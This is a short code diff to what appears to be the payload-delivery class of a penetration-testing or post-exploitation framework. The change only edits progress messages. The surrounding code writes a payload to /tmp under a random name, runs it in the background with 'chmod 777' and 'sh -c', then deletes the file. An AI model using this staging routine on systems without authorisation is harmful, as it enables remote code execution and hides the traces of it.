@@ -38,14 +38,12 @@ class Post(Push, StringTools):
     def post(self, payload, sender, args=[], payload_args="", method='printf',
              location='/tmp', delim=';', linemax=100):
         if method in self.post_methods:
-            self.badges.print_process("Sending payload stage...")
+            self.badges.print_process(f"Sending payload stage ({str(len(payload))} bytes)")
 
             filename = self.random_string(8)
             path = location + '/' + filename
 
             self.post_methods[method].push(payload, sender, path, args, linemax)
-
-            self.badges.print_process("Executing payload...")
             sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
         else:
             self.badges.print_error("Invalid post method!")
